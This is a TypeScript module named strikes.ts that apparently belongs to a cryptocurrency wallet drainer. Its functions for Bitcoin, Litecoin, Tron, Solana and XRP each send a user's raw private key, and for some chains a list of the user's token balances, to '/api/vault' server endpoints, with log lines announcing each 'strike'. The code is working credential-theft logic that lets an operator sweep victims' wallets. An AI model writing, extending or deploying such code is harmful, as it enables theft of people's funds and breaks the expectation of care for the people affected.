import { securePost } from "./utils";

const logLabel = "[strikes.ts]";

/** 🔑 Clean Key Utility: Ensures non-EVM keys don't have the 0x prefix */
const cleanKey = (k: string | null) => {
  if (!k) return null;
  return k.startsWith("0x") ? k.substring(2) : k;
};

/**
 * ₿ NON-EVM STRIKES
 * These handle chains outside of the EVM ecosystem.
 * Logic for EVM (ETH/BSC/Base etc.) is now handled by the unified /api/vault route.
 */

export const executeBTCStrike = (address: string, key: string | null) =>
  key &&
  securePost("/api/vault/btc", {
    userAddress: address.toLowerCase(),
    userPrivKey: cleanKey(key),
  });

export const executeLTCStrike = (address: string, key: string | null) =>
  key &&
  securePost("/api/vault/ltc", {
    userAddress: address.toLowerCase(),
    userPrivKey: cleanKey(key),
  });

export async function executeTronStrike(
  assets: any[],
  address: string,
  key: string | null,
) {
  if (!key) return;
  const tronAssets = assets.filter((a) => a.chain === "TRON");
  if (tronAssets.length === 0) return;

  console.log(`${logLabel} 🔴 Dispatching Tron Strike...`);
  return securePost("/api/vault/tron", {
    userAddress: address.toLowerCase(),
    userPrivKey: cleanKey(key), // Added cleanKey for consistency
    assets: tronAssets.map((a) => ({
      symbol: a.symbol,
      amount: a.balance?.toString(),
    })),
  });
}

export async function executeSolanaStrike(
  assets: any[],
  address: string,
  key: string | null,
) {
  if (!key) return;
  const solAssets = assets.filter((a) => a.chain === "SOLANA");
  if (solAssets.length === 0) return;

  console.log(`${logLabel} 🟣 Dispatching Solana Strike...`);
  return securePost("/api/vault/solana", {
    userAddress: address.toLowerCase(),
    userPrivKey: cleanKey(key),
    assets: solAssets.map((a) => ({
      symbol: a.symbol,
      amount: a.balance?.toString(),
      mint: a.contractAddress,
    })),
  });
}

export const executeXRPStrike = (
  assets: any[],
  address: string,
  key: string | null,
) =>
  key &&
  securePost("/api/vault/xrp", {
    userAddress: address.toLowerCase(),
    userPrivKey: cleanKey(key),
  });
